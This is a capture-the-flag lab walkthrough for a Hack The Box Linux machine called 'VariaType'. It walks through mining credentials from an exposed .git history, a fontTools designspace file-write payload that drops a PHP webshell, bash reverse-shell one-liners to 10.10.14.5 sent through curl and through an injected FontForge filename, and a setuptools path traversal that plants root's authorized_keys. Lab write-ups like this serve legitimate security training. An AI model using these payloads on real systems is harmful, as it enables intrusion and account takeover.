---
title: "VariaType"
difficulty: Medium
os: Linux
points: 30
rating: 3.8
date: 2026-03-14
avatar: assets/htb/variatype.png
tags: [Arbitrary File Read, Remote Code Execution, OS Command Injection, Arbitrary File Write, Directory Traversal, Hard-coded Credentials, Insecure Design, Reconnaissance]
htb_url: https://app.hackthebox.com/machines/VariaType
---

## Summary

VariaType is a Linux box built around a font-processing web stack split across two virtual hosts, one public and one internal. I get my foothold by chaining an exposed `.git` directory whose history leaks hardcoded credentials, then weaponising CVE-2025-66034 (fontTools varLib arbitrary file write via XML/CDATA injection in a `.designspace`) to drop a PHP webshell. I move laterally with CVE-2024-25082 (FontForge ZIP-filename command injection) to land a shell as a real user. Root falls to a sudo-runnable Python plugin loader that fetches plugins over a remote URL parsed by a vulnerable setuptools: CVE-2025-47273 path traversal writes my `authorized_keys` into `/root/.ssh/`.

## Enumeration

I start with a full port scan and service detection, which only turns up SSH and HTTP.

```bash
nmap -p- --min-rate=10000 -sV -sC variatype.htb
# 22, 80
```

With web in scope, I fuzz for virtual hosts and find an internal development host alongside a Git host.

```bash
ffuf -u http://FUZZ.variatype.htb -H "Host: FUZZ.variatype.htb" \
     -w ~/wordlists/subdomains.txt -mc 200,403
# git.variatype.htb / dev.variatype.htb (internal)
```

The `git.variatype.htb` vhost exposes a `.git` directory, so I mirror it and dig through history. A `git log -p` over all branches surfaces secrets that were committed and later reverted.

```bash
wget -r http://git.variatype.htb/.git/
cd variatype.git && git log --all --oneline
git log -p | grep -i 'password\|api_key\|token'
# -password = "<creds>"  (in a reverted commit)
```

These credentials grant access to the internal-only font submission portal, which becomes my entry point.

## Foothold

The font submission pipeline processes `.designspace` files with fontTools varLib, which is vulnerable to CVE-2025-66034: an XML CDATA injection that bypasses output-path validation and yields an arbitrary file write. I craft a `.designspace` whose source filename traverses into the webroot and whose CDATA payload is a PHP webshell.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<designspace format="5.0">
  <sources>
    <source filename="../../../../../var/www/html/shell.php" name="x">
      <![CDATA[<?php system($_GET['c']); ?>]]>
    </source>
  </sources>
</designspace>
```

After uploading, the pipeline writes `shell.php` under the webroot. I trigger it with a reverse shell.

```bash
curl 'http://variatype.htb/shell.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.5/4444%200%3E%261%22'
```

From the resulting shell I find a sudo rule allowing me to run a FontForge processing script as another user.

```bash
sudo -u fontuser /usr/bin/fontforge -script /opt/fontforge/process.py "<user input>"
```

`process.py` shells out to a ZIP utility with the user-provided filename, and that filename is interpolated straight into a shell command - CVE-2024-25082. I inject a command-injection payload through the filename to get a shell as `fontuser`.

```bash
filename="x;bash -c 'bash -i >& /dev/tcp/10.10.14.5/4445 0>&1';.zip"
```

## Privilege Escalation

As `fontuser`, sudo lets me run a Python plugin loader as root.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/plugin_loader.py *
```

`plugin_loader.py` calls `setuptools.package_index.PackageIndex.download(url, tmpdir)`, which is vulnerable to CVE-2025-47273 - a path traversal in the way the destination filename is derived from the remote URL. I host a wheel whose URL forces the download to be written outside `tmpdir`, placing my public key directly into `/root/.ssh/authorized_keys`, then SSH in as root.

```bash
python3 -m http.server 8000 &
# Serve a file named ../../../root/.ssh/authorized_keys with your pubkey
sudo /usr/bin/python3 /opt/plugin_loader.py http://10.10.14.5:8000/wheel
ssh root@variatype.htb
```
